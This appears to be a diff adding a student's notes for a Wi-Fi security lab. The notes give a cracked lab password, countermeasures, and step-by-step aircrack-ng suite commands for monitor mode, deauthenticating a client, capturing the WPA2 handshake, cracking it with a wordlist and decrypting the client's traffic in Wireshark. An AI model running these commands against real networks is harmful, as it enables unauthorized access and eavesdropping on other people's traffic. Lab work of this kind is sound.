@@ -1,0 +1,64 @@
+stage_0: What is the password of the Wi-Fi access point and which rank does it have on the most common password list? Why was it possible to crack it? How can this be circumvented?
+-pw: shamrock
+rank: 1337
+why: wpa2 + easy pw
+how to circumvented: wp3 and longer pw with various symbols in it
+
+stage_1: What link is the client trying to access? Why were you able to extract the full url? How can this be circumenvented (a) by the client, (b) by the Wi-Fi operator?
+link: [Full request URI: http://www.youtube.com/watch?v=dQw4w9WgXcQ]
+how to circumenvented: 
+	admin:LAN is better than WLAN, long and secure password,  Upgrade to WPA3, use MFP (802.11w) to protect against deauthentication, 
+		employ MAC address filtering or two-factor authentication, Create VLANs to isolate different groups of devices 
+	user: Disable auto-connect settings, Randomize device's MAC address, 
+		encrypted communication like HTTPS, SSL/TLS, Use a VPN, Use Static IP or Alternate Protocols
+
+change layout:
+setxkbmap -layout de
+
+stage0:
+#sudo airmon-ng check kill
+
+start monitor mode:
+sudo airmon-ng start wlan0
+
+check mode:
+iwconfig/iw dev
+
+check available wifi networks:
+sudo airodump-ng wlan0mon
+
+capture traffic:
+sudo airodump-ng -w <file_name e.g. handshake> -c <CH> --bssid <BSSID> wlan0mon
+
+deauth:
+sudo aireplay-ng --deauth 0 -a <BSSID> wlan0mon
+sudo aireplay-ng --deauth 5 -a <AP_BSSID> -c B8:27:EB:CD:3E:5B wlan0mon
+B8:27:EB:CD:3E:5B - client's MAC
+
+wordlists
+
+crack the pw:
+aircrack-ng <file_name>.cap -w <txt_file_with_passwords>.txt
+
+#sudo wifite
+
+stage1:
+capture 4 way handshake (capture + deauth);
+
+decrypt traffic:
+https://wiki.wireshark.org/HowToDecrypt802.11
+provide the Wi-Fi password in Wireshark:
+Edit > Preferences.
+Protocols > IEEE 802.11.
+Enter the Wi-Fi password under Decryption Keys.
+
+wireshark filter:
+http.request and wlan.addr == <Client_MAC>
+(B8:27:EB:CD:3E:5B)
+
+eapol - handshakes
+
+look for the (web) resources
+
+
+
